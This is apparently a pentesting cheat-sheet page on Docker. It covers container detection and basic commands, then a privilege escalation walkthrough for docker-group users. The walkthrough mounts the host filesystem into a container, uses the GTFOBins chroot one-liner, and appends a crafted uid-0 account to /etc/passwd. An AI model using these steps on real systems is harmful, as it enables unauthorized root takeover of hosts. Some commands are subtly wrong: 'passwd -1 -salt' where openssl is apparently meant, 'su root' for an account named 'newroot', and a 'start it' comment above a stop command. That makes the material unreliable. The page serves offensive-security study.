# Docker

### Check if you are inside a Docker

{% code overflow="wrap" %}
```bash
Target> if [ -f "/.dockerenv" ] || grep -qE "^/docker/|/docker-ce/|/containerd/|/lxc/|/docker-[[:alnum:]]+/" /proc/1/cgroup ; then echo "Running inside a Docker container"; else echo "Not running inside a Docker container"; fi
```
{% endcode %}

### Basic commands

{% code overflow="wrap" %}
```bash
# Check if docker service is running
sudo systemctl status docker

# If not running , start it
sudo systemctl stop docker
sudo systemctl start docker 

# List of images
docker images

# List of remote host images 
docker -H <target-ip>:2375 images

# List of running containers
docker ps -a

# Run the docker to an interactive container with a shell
docker exec -ti flast101 sh
-t: terminal
-i: interactive

# Connect to an running docker with an interactive shell 
docker exec -ti flast101 sh
-t: terminal
-i: interactive

# Run a docker 
docker run -di --name flast101 alpine:latest
-d: detach
-i: interactive
```
{% endcode %}

### Test your knowledge

[https://flast101.github.io/docker-privesc/](https://flast101.github.io/docker-privesc/)

{% code overflow="wrap" %}
```bash
# Do you understand this command and potential vulnerability?
docker run -tid -v /etc/:/mnt/ --name flast101 ubuntu:latest bash

# GTFOBins. If you are a member of the “docker” group, replace alpine to a target docker name and run it. 
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
{% endcode %}

### PE Local Enumeration

Linpeas.sh may catch the docker group account. In this case, you may be able to run the quick PE win below.

<figure><img src="../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

### Quick Privilege Escalation win

{% code overflow="wrap" %}
```bash
# Validate if you can run. If not, you will see permission denied.
docker ps -a

# Prepare a new root user.
passwd -1 -salt evil newrootpass

# Prepare a file new_account
cd /tmp
echo 'newroot:$1$evil$eu2ySQGNgNghQm4ASTnKa.:0:0:root:/root:/bin/bash' > new.txt

# Run docker
docker run -tid -v /:/mnt/ --name flast101 alpine

#Execute a bash command in the container that will add the new root user to the /etc/passwd file
docker exec -ti flast101 sh -c "cat /mnt/tmp/new.txt >> /mnt/etc/passwd"

# Login as root
su root
```
{% endcode %}

